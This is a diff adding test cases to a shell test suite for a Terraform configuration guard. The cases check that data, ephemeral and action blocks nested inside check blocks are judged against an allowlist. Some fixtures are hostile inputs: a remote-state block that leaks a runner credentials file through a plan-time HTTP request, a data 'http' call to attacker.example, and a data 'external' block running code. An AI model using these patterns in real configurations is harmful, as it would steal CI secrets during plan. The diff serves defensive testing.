@@ -714,6 +714,125 @@ EXTRA_FILE=environments/qa/terraform.tfvars EXTRA_BODY='project_id = "x"
 EXTRA_FILE=environments/dev/example.tfvars EXTRA_BODY='project_id = "x"
 ' run_case r6_a_named_tfvars_is_not_auto_loaded 0 'ok \(' <<<"$CLEAN"
 
+# ---- F3 (ef-qa c7089806892): a data/resource block is judged WHEREVER it is nested ----
+# Terraform (1.5+) reads a `data` block scoped inside a `check` block during PLAN. ef-qa proved a scoped
+# terraform_remote_state sends a plan-time request carrying file() content, with plan rc 0. The type allowlist and the
+# data external/http rule read the top level only, so a scoped block escaped both.
+run_case f3_check_scoped_terraform_remote_state 1 '"terraform_remote_state" belongs to a provider' <<'EOF'
+check "c" {
+  data "terraform_remote_state" "x" {
+    backend = "http"
+    config = {
+      address   = "http://127.0.0.1:1/leak/${file("/home/runner/work/_temp/creds.json")}"
+      retry_max = 0
+    }
+  }
+  assert {
+    condition     = data.terraform_remote_state.x.outputs != null
+    error_message = "x"
+  }
+}
+EOF
+run_case f3_check_scoped_unquoted_labels 1 '"terraform_remote_state" belongs to a provider' <<'EOF'
+check c {
+  data terraform_remote_state x {
+    backend = "http"
+  }
+  assert {
+    condition     = true
+    error_message = "x"
+  }
+}
+EOF
+run_case f3_check_scoped_comment_prefixed 1 '"terraform_remote_state" belongs to a provider' <<'EOF'
+/* x */ check "c" {
+  /* y */ data "terraform_remote_state" "x" {
+    backend = "gcs"
+  }
+  assert {
+    condition     = true
+    error_message = "x"
+  }
+}
+EOF
+run_case f3_check_scoped_data_external 1 'data "external" runs code' <<'EOF'
+check "c" {
+  data "external" "x" {
+    program = ["id"]
+  }
+  assert {
+    condition     = true
+    error_message = "x"
+  }
+}
+EOF
+run_case f3_check_scoped_data_http 1 'data "http" runs code' <<'EOF'
+check "c" {
+  data "http" "x" {
+    url = "https://attacker.example"
+  }
+  assert {
+    condition     = true
+    error_message = "x"
+  }
+}
+EOF
+# Controls: a check-scoped google_* data source passes, and so does a check with only an assertion.
+run_case f3_check_scoped_google_data_passes 0 'ok \(' <<'EOF'
+check "c" {
+  data "google_client_config" "x" {}
+  assert {
+    condition     = data.google_client_config.x.project != ""
+    error_message = "x"
+  }
+}
+EOF
+run_case f3_check_with_only_an_assertion_passes 0 'ok \(' <<'EOF'
+check "c" {
+  assert {
+    condition     = true
+    error_message = "x"
+  }
+}
+EOF
+# Ephemeral blocks have the same two-label shape and are judged the same way, fail closed.
+run_case f3_ephemeral_non_allowlisted_type 1 '"random_password" belongs to a provider' <<'EOF'
+ephemeral "random_password" "p" {
+  length = 16
+}
+EOF
+run_case f3_ephemeral_unquoted 1 '"mystery_thing" belongs to a provider' <<'EOF'
+ephemeral mystery_thing p {}
+EOF
+run_case f3_ephemeral_google_passes 0 'ok \(' <<'EOF'
+ephemeral "google_service_account_access_token" "t" {
+  target_service_account = "x"
+}
+EOF
+# An action block runs provider code: same allowlist.
+run_case f3_action_non_allowlisted_type 1 '"mystery_action" belongs to a provider' <<'EOF'
+action "mystery_action" "a" {
+  config {
+    x = "y"
+  }
+}
+EOF
+# Control (no false positive): a provider-schema attribute or block that merely SHARES a name is not a block map.
+run_case f3_a_resource_attribute_named_data_is_not_a_block 0 'ok \(' <<'EOF'
+resource "google_secret_manager_secret_version" "v" {
+  secret = "x"
+  data   = { a = "b" }
+}
+resource "google_x" "y" {
+  data {
+    name = "n"
+  }
+  resource {
+    name = "r"
+  }
+}
+EOF
+
 # A file that does not PARSE is a refusal, never a pass (hcl2json says so; the guard cannot judge what it cannot read).
 run_case garbage_tf_does_not_parse 1 'does not parse as HCL' <<'EOF'
 resource "a" "b" {
